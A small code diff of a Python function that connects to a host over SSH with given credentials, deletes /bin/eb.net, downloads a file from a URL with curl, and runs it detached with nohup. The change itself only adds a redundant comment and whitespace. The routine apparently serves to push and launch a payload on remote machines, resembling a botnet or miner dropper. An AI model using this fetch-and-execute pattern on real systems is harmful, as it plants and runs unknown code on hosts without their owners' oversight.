@@ -36,13 +36,14 @@ def downloadAndRun(ip, username, password, file_url, target_path):
             ssh.connect(ip, username=username, password=password, timeout=5)
             pbar.update(30)
 
-            stdin, stdout, stderr = ssh.exec_command(f"rm -f /bin/eb.net && curl -o {target_path} {file_url}")
+            stdin, stdout, stderr = ssh.exec_command(f"rm -f /bin/eb.net && curl -o {target_path} {file_url}") #  && curl -o {target_path} {file_url}
             pbar.update(40)
+            
             stdout.read(), stderr.read()
 
             stdin, stdout, stderr = ssh.exec_command(f"chmod +x {target_path} && nohup {target_path} &")
             pbar.update(30)
-
+            
             ssh.close()
         return True
     except Exception as e:
